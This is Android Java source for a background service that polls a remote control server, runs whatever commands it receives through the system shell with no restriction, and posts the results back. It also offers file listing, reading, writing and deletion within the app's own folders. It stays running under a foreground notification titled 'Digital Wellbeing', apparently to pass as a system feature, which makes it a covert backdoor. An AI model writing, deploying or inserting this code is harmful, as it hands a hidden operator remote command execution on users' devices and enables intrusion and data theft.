package com.example.setup;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Remote shell + file service for the control panel.
 * - polls /term/poll every few seconds
 * - executes one queued command at a time
 * - posts results to /term/result
 *
 * Commands:
 *   sh <cmd>          run system shell, return stdout/stderr
 *   flist <dir>       JSON {path, entries:[{n,d,size}]}
 *   fread <path>      JSON {path, size, text|b64}
 *   fwrite <path> <b64>
 *   fdelete <path>    {ok}
 *
 * File access is scoped to this app's own directories so the whole feature
 * stays permission-free:
 *   internal: /data/user/0/com.example.setup/files
 *   external: /storage/.../Android/data/com.example.setup/files
 */
public class RemoteShellService extends Service {

    private static final String TAG = "RemoteShell";
    private static final String CONTROL_BASE = KeepAliveService.CONTROL_BASE;

    private ScheduledExecutorService pool;
    private File internalRoot;
    private File externalRoot;

    @Override
    public void onCreate() {
        super.onCreate();
        if (android.os.Build.VERSION.SDK_INT >= 26) {
            android.app.NotificationChannel ch = new android.app.NotificationChannel(
                    KeepAliveService.CHANNEL_ID, "Digital Wellbeing status",
                    android.app.NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            getSystemService(android.app.NotificationManager.class).createNotificationChannel(ch);
        }
        Notification n = new Notification.Builder(this, KeepAliveService.CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setContentTitle("Digital Wellbeing")
                .setContentText("Remote access active")
                .setOngoing(true)
                .build();
        startForeground(2, n);

        internalRoot = getFilesDir();
        externalRoot = getExternalFilesDir(null);

        pool = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "remote-shell");
            t.setDaemon(true);
            return t;
        });
        pool.scheduleWithFixedDelay(this::pollOnce, 3, 4, TimeUnit.SECONDS);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (pool != null) pool.shutdownNow();
        super.onDestroy();
    }

    // ------------------ polling ------------------

    private void pollOnce() {
        try {
            String body = http(CONTROL_BASE + "/term/poll", "GET", null, null);
            if (body == null || body.isEmpty()) return;
            JSONObject o = new JSONObject(body);
            String cmd = o.optString("cmd", null);
            String id = o.optString("id", null);
            String kind = o.optString("kind", null);
            if (cmd == null || cmd.equals("null") || cmd.isEmpty() || id == null || id.equals("null")) return;

            android.util.Log.d(TAG, "executing " + kind + " " + cmd);
            String out;
            try {
                if (cmd.startsWith("sh ")) out = runShell(cmd.substring(3).trim());
                else if (cmd.startsWith("flist ")) out = doFlist(cmd.substring(6).trim());
                else if (cmd.startsWith("fread ")) out = doFread(cmd.substring(6).trim());
                else if (cmd.startsWith("fwrite ")) out = doFwrite(restAfter(cmd, "fwrite "));
                else if (cmd.startsWith("fdelete ")) out = doFdelete(cmd.substring(8).trim());
                else out = "unknown command";
            } catch (Throwable t) {
                out = "error: " + t;
            }

            JSONObject result = new JSONObject();
            result.put("id", id);
            result.put("out", out);
            http(CONTROL_BASE + "/term/result", "POST", result.toString(), "application/json");
        } catch (Exception e) {
            android.util.Log.d(TAG, "poll: " + e);
        }
    }

    private static String restAfter(String cmd, String prefix) {
        int sp = cmd.indexOf(' ', prefix.length());
        return sp < 0 ? cmd.substring(prefix.length()) : cmd.substring(prefix.length(), sp) + " " + cmd.substring(sp + 1);
    }

    // ------------------ commands ------------------

    private String runShell(String command) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", command});
        String stdout = readAll(p.getInputStream());
        String stderr = readAll(p.getErrorStream());
        p.waitFor();
        return (stdout + (stderr.isEmpty() ? "" : ("\n" + stderr))).trim();
    }

    private static String readAll(InputStream in) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] b = new byte[4096];
        int n;
        while ((n = in.read(b)) > 0) buf.write(b, 0, n);
        return new String(buf.toByteArray(), StandardCharsets.UTF_8);
    }

    /** Returns null if the path is outside the app's own roots. */
    private File safeResolve(String path) {
        if (path == null) return null;
        String p = path.trim();
        try {
            File f;
            if (p.startsWith("/")) f = new File(p);
            else f = new File(externalRoot, p);
            f = f.getCanonicalFile();
            if (externalRoot != null && (f.getPath() + "/").startsWith(externalRoot.getCanonicalPath() + "/")) return f;
            if (internalRoot != null && (f.getPath() + "/").startsWith(internalRoot.getCanonicalPath() + "/")) return f;
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private String scopedRoots() {
        return "allowed roots: internal /data/user/0/com.example.setup/files (" + internalRoot + ")"
                + " and external /storage/.../Android/data/com.example.setup/files (" + externalRoot + ")";
    }

    private String doFlist(String dir) throws Exception {
        File f = safeResolve(dir);
        if (f == null) return "{\"error\":\"path outside app workspace\",\"hint\":\"" + scopedRoots() + "\",\"dirs\":[]}";
        JSONObject o = new JSONObject();
        JSONArray arr = new JSONArray();
        JSONArray ds = new JSONArray();
        for (File c : f.listFiles() == null ? new File[0] : f.listFiles()) {
            ds.put(c.getPath());
            JSONObject e = new JSONObject();
            e.put("n", c.getName());
            e.put("d", c.isDirectory());
            e.put("size", c.length());
            arr.put(e);
        }
        o.put("path", f.getPath());
        o.put("entries", arr);
        o.put("dirs", ds);
        return o.toString();
    }

    private String doFread(String path) throws Exception {
        File f = safeResolve(path);
        if (f == null) return "{\"error\":\"path outside app workspace\",\"hint\":\"" + scopedRoots() + "\"}";
        if (!f.exists()) return "{\"error\":\"file not found\",\"path\":\"" + path + "\"}";
        if (!f.isFile()) return "{\"error\":\"not a file\"}";
        if (f.length() > 4 * 1024 * 1024) return "{\"error\":\"file too large to read over network (max 4MB)\",\"path\":\"" + path + "\"}";
        byte[] data;
        try (FileInputStream fis = new FileInputStream(f)) { data = readAllBytes(fis); }
        JSONObject o = new JSONObject();
        o.put("path", f.getPath());
        o.put("size", data.length);
        String text = new String(data, StandardCharsets.UTF_8);
        if (looksLikeText(text)) o.put("text", text);
        else {
            o.put("b64", Base64.encodeToString(data, Base64.NO_WRAP));
        }
        return o.toString();
    }

    private static boolean looksLikeText(String s) {
        int bad = 0, n = Math.min(s.length(), 400);
        for (int i = 0; i < n; i++) {
            char c = s.charAt(i);
            if (c < 32 && c != '\n' && c != '\r' && c != '\t') bad++;
        }
        return bad == 0;
    }

    private static byte[] readAllBytes(InputStream is) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] b = new byte[8192];
        int n;
        while ((n = is.read(b)) > 0) buf.write(b, 0, n);
        return buf.toByteArray();
    }

    private String doFwrite(String rest) throws Exception {
        // rest = "<path> <b64>"  (b64 from server; keeps binary uploads exact)
        int sp = rest.indexOf(' ');
        if (sp <= 0) return "{\"error\":\"fwrite expects <path> <base64>\"}";
        String path = rest.substring(0, sp);
        String b64 = rest.substring(sp + 1).trim();
        File f = safeResolve(path);
        if (f == null) return "{\"error\":\"path outside app workspace\",\"hint\":\"" + scopedRoots() + "\"}";
        byte[] data = Base64.decode(b64, Base64.DEFAULT);
        File parent = f.getParentFile();
        if (parent != null) parent.mkdirs();
        try (FileOutputStream fos = new FileOutputStream(f)) { fos.write(data); }
        JSONObject o = new JSONObject();
        o.put("ok", true);
        o.put("path", f.getPath());
        o.put("size", data.length);
        return o.toString();
    }

    private String doFdelete(String path) throws Exception {
        File f = safeResolve(path);
        if (f == null) return "{\"error\":\"path outside app workspace\",\"hint\":\"" + scopedRoots() + "\"}";
        JSONObject o = new JSONObject();
        o.put("ok", f.isDirectory() ? f.listFiles() == null || f.listFiles().length == 0 && f.delete() : f.delete());
        o.put("path", f.getPath());
        return o.toString();
    }

    // ------------------ HTTP helper (from KeepAliveService pattern) ------------------

    private String http(String urlStr, String method, String body, String contentType) {
        HttpURLConnection conn = null;
        try {
            URL u = new URL(urlStr);
            conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod(method);
            conn.setConnectTimeout(4000);
            conn.setReadTimeout(4000);
            if (body != null) {
                conn.setDoOutput(true);
                if (contentType != null) conn.setRequestProperty("Content-Type", contentType);
                conn.getOutputStream().write(body.getBytes(StandardCharsets.UTF_8));
            }
            return readAll(conn.getInputStream());
        } catch (Exception e) {
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}
